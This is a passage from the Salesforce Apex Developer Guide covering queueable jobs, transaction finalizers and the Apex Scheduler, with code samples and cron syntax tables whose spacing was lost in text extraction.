System.enqueueJob method returns. This example uses the jobID variable that was obtained in the previous example.
AsyncApexJobjobInfo= [SELECTStatus,NumberOfErrorsFROMAsyncApexJobWHEREId=:jobID];
Similar to future jobs, queueable jobs don’t process batches, and so the number of processed batches and the number of total batches
are always zero.
Adding a Queueable Job with a Specified Minimum Delay
Use the System.enqueueJob(queueable,delay) method to add queueable jobs to the asynchronous execution queue
with a specified minimum delay (0–10 minutes). The delay is ignored during Apex testing.
See System.enqueueJob(queueable,delay) in the Apex Reference Guide.
285
Invoking ApexApex Developer Guide

Warning:  When you set the delay to 0 (zero), the queueable job is run as quickly as possible. With chained queueable jobs,
implement a mechanism to slow down or halt the job if necessary. Without such a fail-safe mechanism in place, you can rapidly
reach the daily async Apex limit.
In the following cases, it would be beneficial to adjust the timing before the queueable job is run.
•
If the external system is rate-limited and can be overloaded by chained queueable jobs that are making rapid callouts.
•
When polling for results, and executing too fast can cause wasted usage of the daily async Apex limits.
This example adds a job for delayed asynchronous execution by passing in an instance of your class implementation of the Queueable
interface for execution. There’s a minimum delay of 5 minutes before the job is executed.
IntegerdelayInMinutes= 5;
ID jobID= System.enqueueJob(newMyQueueableClass(),delayInMinutes);
Admins can define a default org-wide delay (1–600 seconds) in scheduling queueable jobs that were scheduled without a delay parameter.
Use the delay setting as a mechanism to slow default queueable job execution. If the setting is omitted, Apex uses the standard queueable
timing with no added delay.
Note:  Using the System.enqueueJob(queueable,delay) method ignores any org-wide enqueue delay setting.
Define the org-wide delay in one of these ways.
•
From Setup, in the Quick Find box, enter ApexSettings, and then enter a value (1–600 seconds) for Default minimum
enqueue delay (in seconds) for queueable jobs that do not have a delay parameter
•
To enable this feature programmatically with Metadata API, see ApexSettings in the Metadata API Developer Guide.
Adding a Queueable Job with a Specified Stack Depth
Use the System.enqueueJob(queueable,asyncOptions) method where you can specify the maximum stack depth
and the minimum queue delay in the asyncOptions parameter.
The System.AsyncInfo class properties contain the current and maximum stack depths and the minimum queueable delay.
The System.AsyncInfo class has methods to help you determine if maximum stack depth is set in your Queueable request and
to get the stack depths and queue delay for your queueables that are currently running. Use information about the current queueable
execution to make decisions on adjusting delays on subsequent calls.
These are methods in the System.AsyncInfo class.
•
hasMaxStackDepth()
•
getCurrentQueueableStackDepth()
•
getMaximumQueueableStackDepth()
•
getMinimumQueueableDelayInMinutes()
This example uses stack depth to terminate a chained job and prevent it from reaching the daily maximum number of asynchronous
Apex method executions.
// Fibonacci
publicclassFibonacciDepthQueueableimplementsQueueable{
privatelongnMinus1,nMinus2;
publicstaticvoidcalculateFibonacciTo(integerdepth){
AsyncOptionsasyncOptions= new AsyncOptions();
asyncOptions.MaximumQueueableStackDepth= depth;
System.enqueueJob(newFibonacciDepthQueueable(null,null),asyncOptions);
286
Invoking ApexApex Developer Guide

}
privateFibonacciDepthQueueable(longnMinus1param,longnMinus2param){
nMinus1= nMinus1param;
nMinus2= nMinus2param;
}
publicvoidexecute(QueueableContextcontext){
integerdepth= AsyncInfo.getCurrentQueueableStackDepth();
// Calculatestep
longfibonacciSequenceStep;
switchon (depth){
when1, 2 {
fibonacciSequenceStep= 1;
}
whenelse{
fibonacciSequenceStep= nMinus1+ nMinus2;
}
}
System.debug('depth:' + depth+ ' fibonacciSequenceStep:' + fibonacciSequenceStep);
if(System.AsyncInfo.hasMaxStackDepth()&&
AsyncInfo.getCurrentQueueableStackDepth()>=
AsyncInfo.getMaximumQueueableStackDepth()){
// Reachedmaximumstackdepth
Fibonacci__cresult= new Fibonacci__c(
Depth__c= depth,
Result= fibonacciSequenceStep
);
insertresult;
} else{
System.enqueueJob(newFibonacciDepthQueueable(fibonacciSequenceStep,nMinus1));
}
}
}
Testing Queueable Jobs
This example shows how to test the execution of a queueable job in a test method. A queueable job is an asynchronous process. To
ensure that this process runs within the test method, the job is submitted to the queue between the Test.startTest and
Test.stopTest block. The system executes all asynchronous processes started in a test method synchronously after the
Test.stopTest statement. Next, the test method verifies the results of the queueable job by querying the account that the job
created.
@isTest
publicclassAsyncExecutionExampleTest{
@isTest
staticvoidtest1(){
// startTest/stopTestblockto forceasyncprocesses
287
Invoking ApexApex Developer Guide

//to run in the test.
Test.startTest();
System.enqueueJob(new AsyncExecutionExample());
Test.stopTest();
// Validatethatthe job has run
// by verifyingthatthe recordwas created.
// Thisqueryreturnsonlythe accountcreatedin testcontextby the
// Queueableclassmethod.
Accountacct= [SELECTName,PhoneFROMAccountWHEREName='Acme'LIMIT1];
System.assertNotEquals(null, acct);
System.assertEquals('(415)555-1212', acct.Phone);
}
}
Chaining Jobs
To run a job after some other processing is done first by another job, you can chain queueable jobs. To chain a job to another job, submit
the second job from the execute() method of your queueable class. You can add only one job from an executing job, which means
that only one child job can exist for each parent job. For example, if you have a second class called SecondJob that implements the
Queueable interface, you can add this class to the queue in the execute() method as follows:
publicclassAsyncExecutionExampleimplementsQueueable{
publicvoidexecute(QueueableContextcontext){
// Yourprocessinglogichere
// Chainthisjob to nextjob by submittingthe nextjob
System.enqueueJob(new SecondJob());
}
}
Note:  Apex allows HTTP and web service callouts from queueable jobs, if they implement the Database.AllowsCallouts
marker interface. In queueable jobs that implement this interface, callouts are also allowed in chained queueable jobs.
You can test chained queueable jobs using appropriate stack depths, but be aware of applicable Apex governor limits. See Adding a
Queueable Job with a Specified Stack Depth.
Queueable Apex Limits
•
The execution of a queued job counts one time against the shared limit for asynchronous Apex method executions. See Lightning
Platform Apex Limits.
•
You can add up to 50 jobs to the queue with System.enqueueJob in a single transaction. In asynchronous transactions (for
example, from a batch Apex job), you can add only one job to the queue with System.enqueueJob. To check how many
queueable jobs have been added in one transaction, call Limits.getQueueableJobs().
•
Because no limit is enforced on the depth of chained jobs, you can chain one job to another. You can repeat this process with each
new child job to link it to a new child job. For Developer Edition and Trial organizations, the maximum stack depth for chained jobs
is 5, which means that you can chain jobs four times. The maximum number of jobs in the chain is 5, including the initial parent
queueable job.
•
When chaining jobs with System.enqueueJob, you can add only one job from an executing job. Only one child job can exist
for each parent queueable job. Starting multiple child jobs from the same queueable job isn’t supported.
288
Invoking ApexApex Developer Guide

Detecting Duplicate Queueable Jobs
Reduce resource contention and race conditions by enqueuing only a single instance of your async Queueable job based on its
signature. Attempting to add more than one Queueable job to the processing queue with the same signature results in a
DuplicateMessageException when you try to enqueue subsequent jobs.
Transaction Finalizers
The Transaction Finalizers feature enables you to attach actions, using the System.Finalizer interface, to asynchronous Apex
jobs that use the Queueable framework. A specific use case is to design recovery actions when a Queueable job fails.
Transaction Finalizers Error Messages
Troubleshoot both semantic and run-time issues by analyzing these error messages.
SEE ALSO:
Apex Reference Guide: Queueable Interface
Apex Reference Guide: QueueableContext Interface
Detecting Duplicate Queueable Jobs
Reduce resource contention and race conditions by enqueuing only a single instance of your async Queueable job based on its signature.
Attempting to add more than one Queueable job to the processing queue with the same signature results in a DuplicateMessageException
when you try to enqueue subsequent jobs.
Build a Queueable Signature
To create a unique queuable signature, first declare an instance of the AsyncOptions class. Then set the value of the instance’s
DuplicateSignature property to a QueueableDuplicateSignature object, which is built using the inner
QueueableDuplicateSignature.Builder class.
To build the queueable signature, add different strings, IDs, or integers using these methods from
QueueableDuplicateSignature.Builder.
•
addString(inputString)
•
addId(inputId)
•
addInteger(inputInteger)
As you build the signature, you can find the size, remaining size, and maximum size of the queueable job signature in bytes using these
methods from the QueueableDuplicateSignature.Builder class.
•
getSize()
•
getRemainingSize()
•
getMaxSize()
When the signature has the required components, call the .build() method and assign the signature to the
DuplicateSignature property.
Enqueue a Job with a Queueable Signature
After you build a queuable signature, enqueue a new job using the System.enqueueJob(queueable,asyncOptions)
method. Set the asyncOptions parameter to the AsyncOptions instance with the queueable signature that identifies the
unique job. When the new job is enqueued, the system checks for existing enqueued jobs with the same signature. If other enqueued
jobs with the same signature are found, then the enqueue operation for the new job fails, and a DuplicateMessageException is thrown.
289
Invoking ApexApex Developer Guide

However, if other jobs with the same signature are already running when the new job is enqueued, then the enqueue operation for the
new job succeeds. Therefore, duplicates of already running jobs can still occur in this case. This behavior occurs because the queuable
signature is removed from the job when it’s first dequeued, so a running job no longer has a signature. This removal guarantees that at
least one job instance for a given signature runs.
Examples
This example builds the async job signature using the User Id and the string MyQueueable.
AsyncOptionsoptions= new AsyncOptions();
options.DuplicateSignature= QueueableDuplicateSignature.Builder()
.addId(UserInfo.getUserId())
.addString('MyQueueable')
.build();
try {
System.enqueueJob(newMyQueueable(),options);
} catch(DuplicateMessageExceptionex) {
//Exceptionis thrownif thereis alreadyan enqueuedjob withthe same
//signature
Assert.areEqual('Attemptto enqueuejob withduplicatequeueablesignature',
ex.getMessage());
}
This example builds the async job signature using the ApexClass Id and the hash value of an sObject.
AsyncOptionsoptions= new AsyncOptions();
options.DuplicateSignature= QueueableDuplicateSignature.Builder()
.addInteger(System.hashCode(someAccount))
.addId([SELECTId FROMApexClass
WHEREName='MyQueueable'].Id)
.build();
System.enqueueJob(newMyQueueable(),options);
Transaction Finalizers
The Transaction Finalizers feature enables you to attach actions, using the System.Finalizer interface, to asynchronous Apex
jobs that use the Queueable framework. A specific use case is to design recovery actions when a Queueable job fails.
The Transaction Finalizers feature provides a direct way for you to specify actions to be taken when asynchronous jobs succeed or fail.
Before Transaction Finalizers, you could only take these two actions for asynchronous job failures:
•
Poll the status of AsyncApexJob using a SOQL query and re-enqueue the job if it fails
•
Fire BatchApexErrorEvents when a batch Apex method encounters an unhandled exception
With transaction finalizers, you can attach a post-action sequence to a Queueable job and take relevant actions based on the job execution
result.
A Queueable job that failed due to an unhandled exception can be successively re-enqueued five times by a transaction finalizer. This
limit applies to a series of consecutive Queueable job failures. The counter is reset when the Queueable job completes without an
unhandled exception.
Finalizers can be implemented as an inner class. Also, you can implement both Queueable and Finalizer interfaces with the same class.
The Queueable job and the Finalizer run in separate Apex and Database transactions. For example, the Queueable can include DML, and
the Finalizer can include REST callouts. Using a finalizer doesn’t count as an extra execution against your daily Async Apex limit. Synchronous
governor limits apply for the Finalizer transaction, except in these cases where asynchronous limits apply:
290
Invoking ApexApex Developer Guide

•
Total heap size
•
Maximum number of Apex jobs added to the queue with System.enqueueJob
•
Maximum number of methods with the future annotation allowed per Apex invocation
For more information on governor limits, see Execution Governors and Limits.
System.Finalizer Interface
The System.Finalizer interface includes the execute method:
globalvoidexecute(System.FinalizerContextctx) {}
This method is called on the provided FinalizerContext instance for every enqueued job with a finalizer attached. Within the execute
method, you can define the actions to be taken at the end of the Queueable job. An instance of System.FinalizerContext is
injected by the Apex runtime engine as an argument to the execute method.
System.FinalizerContext Interface
The System.FinalizerContext interface contains four methods.
•
getAsyncApexJobId method:
globalId getAsyncApexJobId{}
Returns the ID of the Queueable job for which this finalizer is defined.
•
getRequestId method:
globalStringgetRequestId{}
Returns the request ID, a string that uniquely identifies the request, and can be correlated with Event Monitoring logs. To correlate
with the AsyncApexJob table, use the getAsyncApexJobId method instead. The Queueable job and the Finalizer execution
both share the (same) request ID.
•
getResult method:
globalSystem.ParentJobResultgetResult{}
Returns the System.ParentJobResult enum, which represents the result of the parent asynchronous Apex Queueable job
to which the finalizer is attached. The enum takes these values: SUCCESS, UNHANDLED_EXCEPTION.
•
getException method:
globalSystem.ExceptiongetException{}
Returns the exception with which the Queueable job failed when getResult is UNHANDLED_EXCEPTION, null otherwise.
Attach the finalizer to your Queueable jobs using the System.attachFinalizer method.
1.Define a class that implements the System.Finalizer interface.
2.Attach a finalizer within a Queueable job’s execute method. To attach the finalizer, invoke the System.attachFinalizer
method, using as argument the instantiated class that implements the System.Finalizer interface.
globalvoidattachFinalizer(Finalizerfinalizer){}
Implementation Details
•
Only one finalizer instance can be attached to any Queueable job.
291
Invoking ApexApex Developer Guide

•
You can enqueue a single asynchronous Apex job (Queueable, Future, or Batch) in the finalizer’s implementation of the execute
method.
•
Callouts are allowed in finalizer implementations.
•
The Finalizer framework uses the state of the Finalizer object (if attached) at the end of Queueable execution. Mutation of the Finalizer
state, after it’s attached, is therefore supported.
•
Variables that are declared transient are ignored by serialization and deserialization, and therefore don’t persist in the Transaction
Finalizer.
Logging Finalizer Example
This example demonstrates the use of Transaction Finalizers in logging messages from a Queueable job, regardless of whether the job
succeeds or fails. The LoggingFinalizer class here implements both Queueable and Finalizer interfaces. The Queueable implementation
instantiates the finalizer, attaches it, and then invokes the addLog() method to buffer log messages. The Finalizer implementation of
LoggingFinalizer includes the addLog(message, source) method that allows buffering log messages from the Queueable job into finalizer's
state. When the Queueable job completes, the finalizer instance commits the buffered log. The finalizer state is preserved even if the
Queueable job fails, and can be accessed for use in DML in finalizer implementation or execution.
publicclassLoggingFinalizerimplementsFinalizer,Queueable{
// Queueableimplementation
// A queueablejob thatusesLoggingFinalizerto bufferthe log
// and commituponexit,evenif the queueableexecutionfails
publicvoidexecute(QueueableContextctx){
StringjobId= '' + ctx.getJobId();
System.debug('Begin:executingqueueablejob:' + jobId);
try {
// Createan instanceof LoggingFinalizerand attachit
// Alternatively,System.attachFinalizer(this)can be usedinsteadof
instantiatingLoggingFinalizer
LoggingFinalizerf = new LoggingFinalizer();
System.attachFinalizer(f);
// Whileexecutingthe job,log usingLoggingFinalizer.addLog()
// Notethataddlog()modifiesthe Finalizer'sstateafterit is attached
DateTimestart= DateTime.now();
f.addLog('Aboutto do somework...', jobId);
while(true) {
// Resultsin limiterror
}
} catch(Exceptione) {
System.debug('Errorexecutingthe job [' + jobId+ ']: ' + e.getMessage());
} finally{
System.debug('Completed:executionof queueablejob:' + jobId);
}
}
// Finalizerimplementation
// Loggingfinalizerprovidesa publicmethodaddLog(message,source)thatallowsbuffering
log linesfromthe Queueablejob.
// Whenthe Queueablejob completes,regardlessof successor failure,the LoggingFinalizer
292
Invoking ApexApex Developer Guide

instancecommitsthisbufferedlog.
// CustomobjectLogMessage__chas fourcustomfields-seeaddLog()method.
// internallog buffer
privateList<LogMessage__c>logRecords= new List<LogMessage__c>();
publicvoidexecute(FinalizerContextctx){
StringparentJobId= ctx.getAsyncApexJobId();
System.debug('Begin:executingfinalizerattachedto queueablejob:' + parentJobId);
// Updatethe log recordswiththe parentqueueablejob id
System.Debug('Updatingjob id on ' + logRecords.size()+ ' log records');
for (LogMessage__clog : logRecords){
log.Request__c= parentJobId;// or couldbe ctx.getRequestId()
}
// Committhe buffer
System.Debug('committinglog recordsto database');
Database.insert(logRecords,false);
if (ctx.getResult()== ParentJobResult.SUCCESS){
System.debug('Parentqueueablejob [' + parentJobId+ '] completed
successfully.');
} else{
System.debug('Parentqueueablejob [' + parentJobId+ '] faileddue to unhandled
exception:' + ctx.getException().getMessage());
System.debug('Enqueueinganotherinstanceof the queueable...');
}
System.debug('Completed:executionof finalizerattachedto queueablejob:' +
parentJobId);
}
publicvoidaddLog(Stringmessage,Stringsource){
// appendthe log messageto the buffer
logRecords.add(new LogMessage__c(
DateTime__c= DateTime.now(),
Message__c= message,
Request__c= 'setbeforecommit',
Source__c= source
));
}
}
Retry Queueable Example
This example demonstrates how to re-enqueue a failed Queueable job in its finalizer. It also shows that jobs can be re-enqueued up to
a queueable chaining limit of 5 retries.
publicclassRetryLimitDemoimplementsFinalizer,Queueable{
// Queueableimplementation
publicvoidexecute(QueueableContextctx){
293
Invoking ApexApex Developer Guide

StringjobId= '' + ctx.getJobId();
System.debug('Begin:executingqueueablejob:' + jobId);
try {
Finalizerfinalizer= new RetryLimitDemo();
System.attachFinalizer(finalizer);
System.debug('Attachedfinalizer');
IntegeraccountNumber= 1;
while(true) { // resultsin limiterror
Accounta = new Account();
a.Name= 'Account-Number-'+ accountNumber;
inserta;
accountNumber++;
}
} catch(Exceptione) {
System.debug('Errorexecutingthe job [' + jobId+ ']: ' + e.getMessage());
} finally{
System.debug('Completed:executionof queueablejob:' + jobId);
}
}
// Finalizerimplementation
publicvoidexecute(FinalizerContextctx){
StringparentJobId= '' + ctx.getAsyncApexJobId();
System.debug('Begin:executingfinalizerattachedto queueablejob:' + parentJobId);
if (ctx.getResult()== ParentJobResult.SUCCESS){
System.debug('Parentqueueablejob [' + parentJobId+ '] completedsuccessfully.');
} else{
System.debug('Parentqueueablejob [' + parentJobId+ '] faileddue to unhandled
exception:' + ctx.getException().getMessage());
System.debug('Enqueueinganotherinstanceof the queueable...');
StringnewJobId= '' + System.enqueueJob(new RetryLimitDemo());// Thiscallfails
after5 timeswhenit hitsthe chaininglimit
System.debug('Enqueuednew job:' + newJobId);
}
System.debug('Completed:executionof finalizerattachedto queueablejob:' +
parentJobId);
}
}
Considerations
If a job request is terminated unexpectedly, such as a database shutdown during system upgrade, the transaction finalizer can fail to
execute.
Best Practices
We urge ISVs to exercise caution in using global Finalizers with state-mutating methods in packages. If a subscriber org’s implementation
invokes such methods in the global Finalizer, it can result in unexpected behavior. Examine all state-mutating methods to see how they
affect the finalizer state and overall behavior.
294
Invoking ApexApex Developer Guide

Transaction Finalizers Error Messages
Troubleshoot both semantic and run-time issues by analyzing these error messages.
This table provides information about error messages in your Apex debug log.
Table 5: Troubleshooting Errors in Apex Debug Log
Reason for FailureFailed ContextError Message
System.attachFinalizer() is
invoked more than once in the same
Queueable instance.
Queueable ExecutionMore than one Finalizer cannot be attached
to same Async Apex Job
The instantiated class parameter to
System.attachFinalizer()
Queueable ExecutionClass {0} must implement the Finalizer
interface
doesn’t implement the
System.Finalizer interface.
System.attachFinalizer() is
invoked in an Apex context that's not
executing a Queueable instance.
Non-Queueable ExecutionSystem.attachFinalizer(Finalizer) is not
allowed in this context
Invalid number of parameters to
System.attachFinalizer()
Queueable ExecutionInvalid number of parameters
System.attachFinalizer() is
invoked with a null parameter.
Queueable ExecutionArgument cannot be null
If you have a Splunk Add-On for Salesforce, you can analyze error messages in your Splunk log. This table provides information about
error messages in the Splunk log.
Table 6: Troubleshooting Errors in Splunk Log
Reason for FailureError Message
Runtime error while executing Finalizer. This error can be an
unhandled catchable exception or uncatchable exception (such
as a LimitException), or, less commonly, an internal system error.
Error processing finalizer for queueable job id: {0}
Runtime error while executing Finalizer. This error can be an
unhandled catchable exception or uncatchable exception (such
as a LimitException), or, less commonly, an internal system error.
Error processing the finalizer (class name: {0}) for the queueable
job id: {1} (queueable class id: {2})
Apex Scheduler
Use the Apex Scheduler to delay execution so that you can run Apex classes at a specified time. This is ideal for daily or weekly maintenance
tasks using Batch Apex.
To invoke Apex classes to run at specific times, first implement the Schedulable interface for the class, then specify the schedule
using either the Schedule Apex page in the Salesforce user interface, or the System.schedule method.
295
Invoking ApexApex Developer Guide

Important:  Salesforce schedules the class for execution at the specified time. Actual execution can be delayed based on service
availability.
You can only have 100 scheduled Apex jobs at one time. You can evaluate your current count by viewing the Scheduled Jobs
page in Salesforce and creating a custom view with a type filter equal to “Scheduled Apex”. You can also programmatically query
the CronTrigger and CronJobDetail objects to get the count of Apex scheduled jobs.
Use extreme care if you’re planning to schedule a class from a trigger. You must be able to guarantee that the trigger won’t add
more scheduled classes than the limit. In particular, consider API bulk updates, import wizards, mass record changes through the
user interface, and all cases where more than one record can be updated at a time.
If there are one or more active scheduled jobs for an Apex class, you can’t update the class or any classes referenced by this class
through the Salesforce user interface. However, you can enable deployments to update the class with active scheduled jobs by
using the Metadata API (for example, when using the Salesforce extensions for Visual Studio Code). See “Deployment Connections
for Change Sets” in Salesforce Help.
Implementing the Schedulable Interface
To schedule an Apex class to run at regular intervals, first write an Apex class that implements the Salesforce-provided interface
Schedulable.
The scheduler runs as system—all classes are executed, whether the user has permission to execute the class or not.
To monitor or stop the execution of a scheduled Apex job using the Salesforce user interface, from Setup, enter ScheduledJobs
in the QuickFind box, then select Scheduled Jobs.
The Schedulable interface contains one execute method that must be implemented.
globalvoidexecute(SchedulableContextsc){}
The implemented method must be declared as global or public.
Use this method to instantiate the class you want to schedule.
Tip:  Though it's possible to do additional processing in the execute method, we recommend that all processing must take
place in a separate class.
This example implements the Schedulable interface for a class called MergeNumbers:
globalclassScheduledMergeimplementsSchedulable{
globalvoidexecute(SchedulableContextSC) {
MergeNumbersM = new MergeNumbers();
}
}
To schedule the class, execute this example in the Developer Console.
ScheduledMergem = new ScheduledMerge();
Stringsch = '20 30 8 10 2 ?';
StringjobID= System.schedule('MergeJob', sch,m);
You can also use the Schedulable interface with batch Apex classes. The following example illustrates how to implement the
Schedulable interface for a batch Apex class called Batchable:
globalclassScheduledBatchableimplementsSchedulable{
globalvoidexecute(SchedulableContextsc) {
Batchableb = new Batchable();
Database.executeBatch(b);
296
Invoking ApexApex Developer Guide

}
}
An easier way to schedule a batch job is to call the System.scheduleBatch method without having to implement the
Schedulable interface.
Use the SchedulableContext object to track the scheduled job when it's scheduled. The SchedulableContext getTriggerID method
returns the ID of the CronTrigger object associated with this scheduled job as a string. You can query CronTrigger to track the
progress of the scheduled job.
To stop execution of a job that was scheduled, use the System.abortJob method with the ID returned by the getTriggerID
method.
Tracking the Progress of a Scheduled Job Using Queries
After the Apex job has been scheduled, you can obtain more information about it by running a SOQL query on CronTrigger. You can
retrieve the number of times the job has run, and the date and time when the job is scheduled to run again, as shown in this example.
CronTriggerct =
[SELECTTimesTriggered,NextFireTime
FROMCronTriggerWHEREId = :jobID];
The previous example assumes you have a jobID variable holding the ID of the job. The System.schedule method returns the
job ID. If you’re performing this query inside the execute method of your schedulable class, you can obtain the ID of the current job
by calling getTriggerId on the SchedulableContext argument variable. Assuming this variable name is sc, the modified example
becomes:
CronTriggerct =
[SELECTTimesTriggered,NextFireTime
FROMCronTriggerWHEREId = :sc.getTriggerId()];
You can also get the job’s name and the job’s type from the CronJobDetail record associated with the CronTrigger record. To do so, use
the CronJobDetail relationship when performing a query on CronTrigger. This example retrieves the most recent CronTrigger
record with the job name and type from CronJobDetail.
CronTriggerjob =
[SELECTId, CronJobDetail.Id,CronJobDetail.Name,CronJobDetail.JobType
FROMCronTriggerORDERBY CreatedDateDESCLIMIT1];
Alternatively, you can query CronJobDetail directly to get the job’s name and type. This next example gets the job’s name and type for
the CronTrigger record queried in the previous example. The corresponding CronJobDetail record ID is obtained by the
CronJobDetail.Id expression on the CronTrigger record.
CronJobDetailctd =
[SELECTId, Name,JobType
FROMCronJobDetailWHEREId = :job.CronJobDetail.Id];
To obtain the total count of all Apex scheduled jobs, excluding all other scheduled job types, perform the this query. Note the value '7'
is specified for the job type, which corresponds to the scheduled Apex job type.
SELECTCOUNT()FROMCronTriggerWHERECronJobDetail.JobType= '7'
Testing the Apex Scheduler
Here’s an example of how to test using the Apex scheduler.
297
Invoking ApexApex Developer Guide

The System.schedule method starts an asynchronous process. When you test scheduled Apex, you must ensure that the scheduled
job is finished before testing against the results. Use the Test methods startTest and stopTest around the System.schedule
method to ensure it finishes before continuing your test. All asynchronous calls made after the startTest method are collected by
the system. When stopTest is executed, all asynchronous processes are run synchronously. If you don’t include the
System.schedule method within the startTest and stopTest methods, the scheduled job executes at the end of your
test method for Apex saved using Salesforce API version 25.0 and later, but not in earlier versions.
This example defines a class to be tested.
globalclassTestScheduledApexFromTestMethodimplementsSchedulable{
// Thistestrunsa scheduledjob at midnightSept.3rd.2042
publicstaticStringCRON_EXP= '0 0 0 3 9 ? 2042';
globalvoidexecute(SchedulableContextctx){
CronTriggerct = [SELECTId, CronExpression,TimesTriggered,NextFireTime
FROMCronTriggerWHEREId = :ctx.getTriggerId()];
System.assertEquals(CRON_EXP,ct.CronExpression);
System.assertEquals(0,ct.TimesTriggered);
System.assertEquals('2042-09-0300:00:00', String.valueOf(ct.NextFireTime));
Accounta = [SELECTId, NameFROMAccountWHEREName=
'testScheduledApexFromTestMethod'];
a.name= 'testScheduledApexFromTestMethodUpdated';
updatea;
}
}
This code tests the class:
@istest
classTestClass{
statictestmethodvoidtest(){
Test.startTest();
Accounta = new Account();
a.Name= 'testScheduledApexFromTestMethod';
inserta;
// Schedulethe testjob
StringjobId= System.schedule('testBasicScheduledApex',
TestScheduledApexFromTestMethod.CRON_EXP,
new TestScheduledApexFromTestMethod());
// Get the informationfromthe CronTriggerAPI object
CronTriggerct = [SELECTId, CronExpression,TimesTriggered,
NextFireTime
FROMCronTriggerWHEREid = :jobId];
// Verifythe expressionsare the same
System.assertEquals(TestScheduledApexFromTestMethod.CRON_EXP,
298
Invoking ApexApex Developer Guide

ct.CronExpression);
// Verifythe job has not run
System.assertEquals(0,ct.TimesTriggered);
// Verifythe nexttimethe job willrun
System.assertEquals('2042-09-0300:00:00',
String.valueOf(ct.NextFireTime));
System.assertNotEquals('testScheduledApexFromTestMethodUpdated',
[SELECTid, nameFROMaccountWHEREid = :a.id].name);
Test.stopTest();
System.assertEquals('testScheduledApexFromTestMethodUpdated',
[SELECTId, NameFROMAccountWHEREId = :a.Id].Name);
}
}
Using the System.schedule Method
After you implement a class with the Schedulable interface, use the System.schedule method to execute it. The scheduler
runs as system—all classes are executed, whether the user has permission to execute the class or not.
Note:  Use extreme care if you’re planning to schedule a class from a trigger. You must be able to guarantee that the trigger won’t
add more scheduled classes than the limit. In particular, consider API bulk updates, import wizards, mass record changes through
the user interface, and all cases where more than one record can be updated at a time.
The System.schedule method takes three arguments: a name for the job, a cron expression used to represent the time and date
the job is scheduled to run, and the name of the class.
The name for the job must be unique among the jobs scheduled for execution. If you attempt to schedule another job with the same
name, you see the error System.AsyncException:The Apexjob named"jobName" is alreadyscheduled
for execution.
The cron expression has this syntax:
SecondsMinutesHoursDay_of_monthMonthDay_of_weekOptional_year
Note:  Salesforce schedules the class for execution at the specified time. Actual execution can be delayed based on service
availability.
The System.schedule method uses the user's time zone as the basis of all schedules.
These are the values for the expression:
Special CharactersValuesName
None0–59Seconds
None0–59Minutes
, - * /0–23Hours
, - * ? / L W1–31Day_of_month
299
Invoking ApexApex Developer Guide

Special CharactersValuesName
, - * /1–12 or the following:Month
•
JAN
•
FEB
•
MAR
•
APR
•
MAY
•
JUN
•
JUL
•
AUG
•
SEP
•
OCT
•
NOV
•
DEC
, - * ? / L #1–7 or the following:Day_of_week
•
SUN
•
MON
•
TUE
•
WED
•
THU
•
FRI
•
SAT
, - * /null or 1970–2099optional_year
The special characters are defined as follows:
DescriptionSpecial Character
Delimits values. For example, use JAN,MAR,APR to specify more than one month.,
Specifies a range. For example, use JAN-MAR to specify more than one month.-
Specifies all values. For example, if Month is specified as *, the job is scheduled for
every month.
*
Specifies no specific value. This option is only available for Day_of_month and
Day_of_week. It’s typically used when specifying a value for one and not the other.
?
Specifies increments. The number before the slash specifies when the intervals will
begin, and the number after the slash is the interval amount. For example, if you specify
/
1/5 for Day_of_month, the Apex class runs every fifth day of the month, starting
on the first of the month.
300
Invoking ApexApex Developer Guide

DescriptionSpecial Character
Specifies the end of a range (last). This option is only available for Day_of_month
and Day_of_week. When used with Day of month, L always means the last
L
day of the month, such as January 31, February 29 (for leap years), and so on. When
used with Day_of_week by itself, it always means 7 or SAT. When used with a
Day_of_week value, it means the last of that type of day in the month. For example,
if you specify 2L, you’re specifying the last Monday of the month. Don’t use a range
of values with L as the results can be unexpected.
Specifies the nearest weekday (Monday-Friday) of the given day. This option is only
available for Day_of_month. For example, if you specify 20W, and the 20th is a
W
Saturday, the class runs on the 19th. If you specify 1W, and the first is a Saturday, the
class doesn’t run in the previous month, but on the third, which is the following
Monday.
Tip:  Use the L and W together to specify the last weekday of the month.
Specifies the nth day of the month, in the format weekday#day_of_month.
This option is only available for Day_of_week. The number before the # specifies
#
weekday (SUN-SAT). The number after the # specifies the day of the month. For
example, specifying 2#1 means the class runs on the first Monday of every month.
The following are some examples of how to use the expression.
DescriptionExpression
The class runs every day at 1 PM.0 0 13 * * ?
The class runs every hour at 5 minutes past the hour.0 5 * * * ?
Note:  Apex doesn’t allow for a job to be scheduled more
than once an hour.
The class runs on the last Friday of every month at 10 PM.0 0 22 ? * 6L
The class runs Monday through Friday at 10 AM.0 0 10 ? * MON-FRI
The class runs every day at 8 PM during the year 2010.0 0 20 * * ? 2010
In the following example, the class Proschedule implements the Schedulable interface. The class is scheduled to run at 8 AM
on the 13 February.
Proschedulep = new Proschedule();
Stringsch = '0 0 8 13 2 ?';
System.schedule('OneTimePro', sch,p);
Using the System.scheduleBatch Method for Batch Jobs
You can call the System.scheduleBatch method to schedule a batch job to run one time at a specified time in the future. This
method is available only for batch classes and doesn’t require the implementation of the Schedulable interface. It’s therefore easy
301
Invoking ApexApex Developer Guide

to schedule a batch job for one execution. For more details on how to use the System.scheduleBatch method, see Using the
System.scheduleBatch Method.
Apex Scheduler Limits
•
You can only have 100 scheduled Apex jobs at one time. You can evaluate your current count by viewing the Scheduled Jobs page
in Salesforce and creating a custom view with a type filter equal to “Scheduled Apex”. You can also programmatically query the
CronTrigger and CronJobDetail objects to get the count of Apex scheduled jobs.
•
The maximum number of scheduled Apex executions per a 24-hour period is 250,000 or the number of user licenses in your
organization multiplied by 200, whichever is greater. This limit is for your entire org and is shared with all asynchronous Apex: Batch
Apex, Queueable Apex, scheduled Apex, and future methods. To check how many asynchronous Apex executions are available,
make a request to REST API limits resource. See List Organization Limits in the REST API Developer Guide. If the number of
asynchronous Apex executions needed by a job exceeds the available number that’s calculated using the 24-hour rolling limit, an
exception is thrown. For example, if your async job requires 10,000 method executions and the available 24-hour rolling limit is
9,500, you get AsyncApexExecutions Limit exceeded exception. The license types that count toward this limit include full Salesforce
and Salesforce Platform user licenses, App Subscription user licenses, Chatter Only users, Identity users, and Company Communities
users.
Apex Scheduler Notes and Best Practices
•
Salesforce schedules the class for execution at the specified time. Actual execution can be delayed based on service availability.
•
Use extreme care if you’re planning to schedule a class from a trigger. You must be able to guarantee that the trigger won’t add
more scheduled classes than the limit. In particular, consider API bulk updates, import wizards, mass record changes through the
user interface, and all cases where more than one record can be updated at a time.
•
Though it's possible to do additional processing in the execute method, we recommend that all processing must take place in
a separate class.
•
